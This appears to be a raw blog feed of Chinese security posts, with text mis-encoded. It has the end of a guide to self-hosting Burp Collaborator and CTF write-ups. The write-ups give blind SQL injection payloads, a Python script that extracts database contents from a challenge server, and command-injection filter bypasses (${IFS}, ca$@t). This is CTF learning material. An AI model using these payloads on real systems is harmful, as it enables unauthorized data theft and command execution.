burpcollaborator-docker</span><br></pre></td></tr></table></figure><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/2.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;https://portswigger.net/burp/releases/download?product=pro&amp;version=2021.10.3&amp;type=Jar&quot;</span></span><br><span class="line"><span class="built_in">mv</span> <span class="string">&#x27;download?product=pro&amp;version=2021.10.3&amp;type=Jar&#x27;</span> burp.jar &amp;&amp; <span class="built_in">mv</span> burp.jar ./burp/pkg/burp.jar</span><br></pre></td></tr></table></figure><p>ç¡®ä¿å°†åŸŸåå’ŒIPæ›¿æ¢ä¸ºå“åº”çš„åŸŸåå’ŒæœåŠ¡å™¨IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./init.sh burp.hackplaza.net 20.119.42.229</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ é‡åˆ°è¿™æ ·çš„é”™è¯¯ã€‚</p><p>Error starting userland proxy: listen tcp4 0.0.0.0:53: bind: address already in use.</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/3.png" alt></p><p>ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è§£å†³ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl stop systemd-resolved</span><br></pre></td></tr></table></figure><h2 id="å…¥ç«™è§„åˆ™">å…¥ç«™è§„åˆ™</h2><p>å¦‚æœä½ å†æ¬¡é‡åˆ°è¿™æ ·çš„é”™è¯¯ã€‚</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/4.png" alt></p><p>ä½ å¿…é¡»åœ¨ç½‘ç»œç»„ä¸­è¿›è¡Œä¸€äº›æ›´æ”¹æ‰èƒ½å…è®¸å…¥ç«™é“¾æ¥ã€‚ä½ å¿…é¡»ç›¸åº”åœ°åœ¨VPSæä¾›å•†ä¸­æ‰§è¡Œæ­¤æ“ä½œã€‚æˆ‘æ­£åœ¨ä½¿ç”¨Azureï¼Œæ‰€ä»¥è¿™æ˜¯å¦‚ä½•åšåˆ°çš„ã€‚</p><p>Click on VM &gt; Networking &gt; Add inbound port rule &gt; In Destination Port ranges keep * in it and finally click on Add</p><p>å•å‡»â€œVMâ€&gt;â€œç½‘ç»œ&gt;â€æ·»åŠ å…¥ç«™ç«¯å£è§„åˆ™â€œ&gt;â€åœ¨ç›®æ ‡ç«¯å£èŒƒå›´ä¸­ä¿ç•™ *â€œï¼Œæœ€åå•å‡»â€æ·»åŠ â€</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/5.png" alt></p><p>å†æ¬¡è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./init.sh burp.hackplaza.net 20.119.42.229</span><br></pre></td></tr></table></figure><p>å°†åŸŸåå’ŒæœåŠ¡å™¨IPæ›¿æ¢ä¸ºä½ è‡ªå·±çš„IPã€‚</p><p>æˆåŠŸå®Œæ•´çš„å®‰è£…è¾“å‡ºå°†å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/6.png" alt></p><h2 id="ä½¿ç”¨BurpSuite-Proè¿›è¡Œæµ‹è¯•">ä½¿ç”¨BurpSuite Proè¿›è¡Œæµ‹è¯•</h2><p>æ‰“å¼€æ‚¨çš„ Burp Suite Professional</p><p>Click on Project Options Tab &gt; Misc &gt; Burp Collaborator Server<br>å•å‡»â€œé¡¹ç›®é€‰é¡¹â€é€‰é¡¹å¡ &gt; â€œæ‚é¡¹â€&gt; Burp Collaborator Server</p><p>Select use private collaborator and do like shown in picture and click on Run Health check</p><p>é€‰æ‹©ä½¿ç”¨private collaboratorï¼Œå¹¶å¦‚å›¾æ‰€ç¤ºï¼Œç„¶åå•å‡»è¿è¡Œè¿è¡ŒçŠ¶å†µæ£€æŸ¥</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/7.png" alt></p><p>ç°åœ¨ï¼Œæ‚¨å¯ä»¥ä»BurpSuite Proæ­£å¸¸ä½¿ç”¨æ‚¨çš„private Burp CollaboratoræœåŠ¡å™¨ã€‚</p><p>ä¸Šè¿°ä¸ºåŸæ–‡çš„ç¿»è¯‘éƒ¨åˆ†ï¼Œä¸‹é¢ä¸ºè‡ªå·±å®‰è£…æ—¶é‡åˆ°çš„é—®é¢˜ã€‚</p><h2 id="é…ç½®é—®é¢˜">é…ç½®é—®é¢˜</h2><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/8.png" alt></p><h2 id="è¯ä¹¦é—®é¢˜">è¯ä¹¦é—®é¢˜</h2><p>certboté»˜è®¤ç”Ÿæˆè¯ä¹¦ä½¿ç”¨çš„æ˜¯ECç®—æ³•ï¼Œå¤„ç†è¯ä¹¦ä½¿ç”¨çš„æ˜¯å¤„ç†RSAè¯ä¹¦çš„ä»£ç ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹è¯ä¹¦ä¸ºRSAè¯ä¹¦ã€‚</p><p>/burpcollaborator-docker/certbot/new.sh</p><p>è¿™ä¸ªæ˜¯ç”Ÿæˆè¯ä¹¦çš„æ–‡ä»¶ï¼Œåœ¨æœ«å°¾åŠ ä¸Š<code>--key-type rsa</code>å³å¯ã€‚</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/9.png" alt></p><p>Burpsuite Collaboratoré…ç½®</p><p><img src="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/10.png" alt></p><h2 id="å…¶ä»–é—®é¢˜">å…¶ä»–é—®é¢˜</h2><p><code>docker logs burp</code>æŸ¥çœ‹burpæŠ¥é”™çš„åŸå› ï¼Œæ‰¾é—®é¢˜æ‰€åœ¨ã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><a href="https://hackplaza.net/2021/12/17/how-to-setup-private-burp-collaborator/">https://hackplaza.net/2021/12/17/how-to-setup-private-burp-collaborator/</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
            <tag> dnslog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFåšé¢˜è®°å½•</title>
      <link href="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="NewStarCTF-2023-web-week3-midsql-sql">[NewStarCTF 2023] web week3 midsql_sql</h3><p>é€šè¿‡å¸ƒå°”åˆ¤æ–­å­˜åœ¨sqlæ³¨å…¥ã€‚</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_1.png" alt></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_2.png" alt></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_3.png" alt></p><p>æ•°æ®åº“åä¸ºï¼š<code>ctf</code>ï¼Œ<code>left('abcde',3)='abc'</code>ä»å­—ç¬¦ä¸²çš„å·¦è¾¹å¼€å§‹æˆªå–3ä¸ªå­—ç¬¦ã€‚</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_4.png" alt></p><p>ç»è¿‡æµ‹è¯•å‘ç°ï¼Œæ— æ³•è¿›è¡Œunionæ³¨å…¥ï¼Œselectç­‰æ•æ„Ÿå‡½æ•°è¢«è¿‡æ»¤ï¼Œå¯é€šè¿‡å¤§å°å†™ç»•è¿‡ã€‚</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/no_union.png" alt></p><p>å…³é”®å‡½æ•°<code>group_concat(table_name)</code>ï¼Œå°†åˆ†ç»„ä¸­çš„å€¼è¿æ¥ç»„åˆï¼Œå³è¿™é‡Œå°†è¡¨åè¿æ¥ç»„åˆã€‚é€šè¿‡æ­¤å‡½æ•°å¾—åˆ°è¡¨åã€åˆ—åã€‚</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_5.png" alt></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_6.png" alt></p><p>åˆ©ç”¨åˆ°çš„payloadå¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &amp;&amp; 1-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="number">0</span><span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; &amp;&amp; if((length(database())=3),1,0)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="keyword">left</span>(database(),<span class="number">3</span>)<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span><span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; &amp;&amp; if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema=&#x27;</span>ctf<span class="string">&#x27;),1,1))=t,1,0)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> if(Ascii(Substr((<span class="keyword">Select</span> Group_concat(column_name) <span class="keyword">From</span> infOrmation_schema.columns <span class="keyword">Where</span> Table_name<span class="operator">=</span><span class="string">&#x27;here_is_flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span>t,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šè¿°çš„è·å–è¡¨åå’Œåˆ—åçš„sqlè¯­å¥ï¼Œé€šè¿‡å­—ç¬¦çš„<strong>ASCII</strong>å’Œ<strong>t</strong>æ¯”è¾ƒå¤§å°ï¼Œå¯ä»¥åˆ©ç”¨äºŒåˆ†æ³•å¿«é€Ÿè¾“å‡ºæ•°æ®åº“åã€è¡¨åã€åˆ—åç­‰ä¿¡æ¯ã€‚</p><p>ä¸ªäººæ„Ÿè§‰æ¯”è¾ƒå¥½ç”¨çš„pocå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://8bbb955c-7d10-474e-8234-4da0fb1ae4d9.node5.buuoj.cn:81/?id=TMP0919&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DBname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--åº“å</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#æ ¹æ®æ•°æ®åŒ…çš„ç‰¹å¾åˆ¤æ–­</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“åä¸ºï¼š&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TBname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--è¡¨å</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema=&#x27;ctf&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®è¡¨åä¸ºï¼š&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CLname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--åˆ—å</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(column_name) From infOrmation_schema.columns Where Table_name=&#x27;here_is_flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åˆ—åä¸ºï¼š&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Valname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--æŠ¥æ•°æ®</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(flag) From here_is_flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®ä¸ºï¼š&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line">DBname()</span><br><span class="line">TBname()</span><br><span class="line">CLname()</span><br><span class="line">Valname()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯å¾—åˆ°flag</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/flag.png" alt></p><p>å‚è€ƒ</p><ul><li><a href="https://blog.csdn.net/m0_73512445/article/details/133694293">[NewStarCTF 2023] webé¢˜è§£</a></li></ul><h3 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-So-Baby-RCE">[NewStarCTF å…¬å¼€èµ›èµ›é“]So Baby RCE</h3><p>é¢˜ç›®å¦‚ä¸‹ï¼š</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_1.png" alt></p><p>å‘ç°ä»£ç ä¸­æ²¡æœ‰è¿‡æ»¤<code>ls</code></p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_2.png" alt></p><p>å½“å‰ç›®å½•ä¸‹ä»€ä¹ˆä¸œè¥¿ï¼Œå°è¯•è·¨ç›®å½•è¯»å–æ–‡ä»¶ï¼Œ<code>cd </code>æœªè¿‡æ»¤ï¼Œ<code>&amp;</code>æœªè¿‡æ»¤ï¼Œ<code>cat</code>è¢«è¿‡æ»¤ï¼Œé€šè¿‡æ·»åŠ ç‰¹æ®Šå­—ç¬¦ç»•è¿‡<code>ca$@t</code>ã€‚è®°ä½$@ç‰¹æ®Šå­—ç¬¦çš„ä½¿ç”¨ï¼Œå¾ˆå¤šæƒ…å†µä¸‹å¯ä»¥ç»•è¿‡ã€‚</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_3.png" alt></p><p>Payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd%09..%26%26cd%09..%26%26cd%09..%26%26ls%26%26ca$@t%09ffff$@llllaaaaggggg</span><br></pre></td></tr></table></figure><h4 id="ç©ºæ ¼ä»£æ›¿">ç©ºæ ¼ä»£æ›¿</h4><p>å‘½ä»¤æ‰§è¡Œä¸­ç©ºæ ¼è¢«è¿‡æ»¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS<span class="variable">$9</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09</span></span><br></pre></td></tr></table></figure><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_1.png" alt></p><blockquote><p><code>$IFS</code>åœ¨linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œåªæœ‰<code>cat$IFSa.txt</code>çš„æ—¶å€™ï¼Œbashè§£æå™¨ä¼šæŠŠæ•´ä¸ªIFSaå½“ä½œå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´æ²¡æœ‰åŠæ³•è¿è¡Œï¼Œç„¶è€Œå¦‚æœåŠ ä¸Š{}å°±å›ºå®šäº†å˜é‡åï¼ŒåŒç†åœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ã€‚</p><p><code>$9</code>æŒ‡çš„æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œè‹¥æ²¡æœ‰9ä¸ªå‚æ•°ï¼Œåˆ™ä¸ºç©ºï¼Œå› æ­¤$9ç›¸å½“äºæ²¡æœ‰åŠ ä¸œè¥¿ï¼Œç­‰äºåšäº†ä¸€ä¸ªå‰åéš”ç¦»ã€‚</p></blockquote><p>ä¸ä»…ä»…å±€é™äº<code>$9</code>ï¼Œ$åŠ ä¸€ä¸ªä¸€ä½æ•°å­—å‡å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">echo &quot;å‚æ•°1ï¼š&quot; $1</span><br><span class="line">echo &quot;å‚æ•°2ï¼š&quot; $2</span><br><span class="line">echo &quot;å‚æ•°3ï¼š&quot; $3</span><br><span class="line">echo &quot;å‚æ•°4ï¼š&quot; $4</span><br><span class="line">echo &quot;å‚æ•°5ï¼š&quot; $5</span><br><span class="line">echo &quot;å‚æ•°6ï¼š&quot; $6</span><br><span class="line">echo &quot;å‚æ•°7ï¼š&quot; $7</span><br><span class="line">echo &quot;å‚æ•°8ï¼š&quot; $8</span><br><span class="line">echo &quot;å‚æ•°9ï¼š&quot; $9</span><br><span class="line">echo &quot;å‚æ•°10ï¼š&quot; $10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æµ‹è¯•  ./test.sh a b c d c d e f g h</span> </span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_2.png" alt></p><blockquote><p><code>$8ã€$9</code>å› ä¸ºæ²¡æœ‰ä¼ é€’å‚æ•°ï¼Œè¿”å›çš„ç»“æœä¸ºç©ºã€‚</p><p><code>$10</code>è¢«è§£ææˆäº†<code>$1</code>å’Œ0ï¼Œæ‰€ä»¥ç»“æœä¼šæ˜¯<code>a0</code>ï¼Œè‹¥æƒ³è·å–ç¬¬10ä¸ªå˜é‡ä½¿ç”¨<code>$&#123;10&#125;</code>ã€‚</p></blockquote><h4 id="è¯»å–å†…å®¹">è¯»å–å†…å®¹</h4><p>åˆ—å‡ºç›®å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee #ls -l| tee 1.txt</span><br></pre></td></tr></table></figure><blockquote><p>teeå‘½ä»¤é€šå¸¸çš„ç”¨æ³•æ˜¯å°†ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼ŒåŒæ—¶åœ¨ç»ˆç«¯ä¸Šæ˜¾ç¤ºè¾“å‡ºå†…å®¹ã€‚</p></blockquote><p>è¯»å–æ–‡ä»¶</p><p><code>cat</code>è¢«ç¦ç”¨ï¼Œä½¿ç”¨ä¸‹åˆ—å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat   # ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º</span><br><span class="line">tac   # ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º</span><br><span class="line">more  # æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„ç°å®æ–‡ä»¶å†…å®¹</span><br><span class="line">less  # å’Œmoreç±»ä¼¼ï¼Œä½†å…¶ä¼˜ç‚¹å¯ä»¥å¾€å‰ç¿»é¡µï¼Œè€Œä¸”è¿›è¡Œå¯ä»¥æœç´¢å­—ç¬¦</span><br><span class="line">head  # åªæ˜¾ç¤ºå¤´å‡ è¡Œ</span><br><span class="line">tail  # åªæ˜¾ç¤ºæœ€åå‡ è¡Œ</span><br><span class="line">nl    # ç±»ä¼¼äºcat -nï¼Œæ˜¾ç¤ºæ—¶è¾“å‡ºè¡Œå·</span><br><span class="line">tailf # ç±»ä¼¼äºtail -f</span><br><span class="line">sort # è¯»æ–‡ä»¶</span><br></pre></td></tr></table></figure><h4 id="åŠ ç‰¹æ®Šå­—ç¬¦ç»•è¿‡">åŠ ç‰¹æ®Šå­—ç¬¦ç»•è¿‡</h4><p><code>cat</code>è¢«ç¦ç”¨ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca\t fl\ag.txt</span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">@t fl<span class="variable">$@ag</span>.txt</span></span><br><span class="line">c&#x27;a&#x27;t flag.txt</span><br><span class="line">c&quot;a&quot;t flag.txt</span><br></pre></td></tr></table></figure><h4 id="ç¼–ç ç»•è¿‡">ç¼–ç ç»•è¿‡</h4><figure class="highlight 